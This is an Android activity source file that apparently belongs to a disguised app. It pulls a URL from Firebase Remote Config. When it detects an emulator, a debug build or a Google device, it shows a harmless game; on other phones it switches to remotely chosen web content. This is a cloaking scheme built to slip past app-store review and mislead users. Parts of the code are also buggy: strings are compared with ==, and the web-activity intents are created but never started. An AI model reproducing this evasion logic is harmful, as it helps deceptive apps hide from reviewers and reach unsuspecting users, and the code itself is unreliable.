package win.winwin.oneapp;

import static android.content.ContentValues.TAG;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.BuildConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    InternetDetector cd;
    final String NewUrl = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //ЛОКАЛ ХРАНЕНИЕ
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(MainActivity.this);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        //ВЕБВЬЮ
        //КОНЕЦ ВЕБВЬЮ

        //ИНТЕРНЕТ
        cd = new InternetDetector(this);
        //
        String urlq = sharedPreferences.getString(NewUrl, "");
        System.out.println(urlq);
        //Ссылка не сохранена
        if (urlq == ""){
            try{
                FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(3600)
                        .build();
                mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                mFirebaseRemoteConfig.setDefaultsAsync(R.xml.remote_config_defaults);
                mFirebaseRemoteConfig.fetchAndActivate()
                        .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                            @Override
                            public void onComplete(@NonNull Task<Boolean> task) {
                                if (task.isSuccessful()) {
                                    boolean updated = task.getResult();
                                    Log.d(TAG, "Config params updated: " + updated);
                                    String find = mFirebaseRemoteConfig.getString("url");
                                    //если не получаем то игра иначе сохраняем и запускаем веб
                                    if (find.isEmpty() || devphone()) {
                                        Intent intent = new Intent(MainActivity.this, GameActivity.class);
                                        startActivity(intent);
                                    } else {
                                        editor.putString(NewUrl, find);
                                        editor.commit();
                                        Intent intent = new Intent(MainActivity.this, WebActivity.class);
                                    }
                                } else {
                                    Toast.makeText(MainActivity.this, "Fetch failed",
                                            Toast.LENGTH_SHORT).show();
                                    if (NewUrl.isEmpty() || devphone()) {
                                        Intent intent = new Intent(MainActivity.this, GameActivity.class);
                                        startActivity(intent);
                                    }
                                }
                            }
                        });

            }catch (Exception e){
                Log.d(TAG, e.getMessage());
            }
        }else {
            //Ссылка сохранена
            //Интернет отключён?
            if (!cd.isConnected()){
                Toast.makeText(MainActivity.this, "Please turn internet on", Toast.LENGTH_SHORT).show();
                showDialog("win.winwin.oneapp");
            } else {
                Intent intent = new Intent(MainActivity.this, WebActivity.class);
            }
        }
    }
    @SuppressLint("SetJavaScriptEnabled")
    private Boolean devphone() {
        if (BuildConfig.DEBUG) return true;

        String phoneModel = Build.MODEL;
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        String brand = Build.BRAND;


        boolean result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.toLowerCase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || brand.contains("google")
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.toLowerCase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.toLowerCase(Locale.getDefault()).contains("nox")
                || buildHardware.toLowerCase(Locale.getDefault()).contains("nox")
                || buildProduct.toLowerCase(Locale.getDefault()).contains("nox"));

        if (result) return true;
        result = result || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"));
        if (result) return true;
        result = result || ("google_sdk" == buildProduct);
        return result;
    }

    //ВКЛЮЧИ ИНЕТ
    private void showDialog(final String appPackageName){
        final AlertDialog dialog = new AlertDialog.Builder(this)
                .setTitle("Warning")
                .setMessage("The application requires an internet connection")
                .setPositiveButton("Ok", (dialogInterface, i) -> finish())
                .show();
    }
    //
}
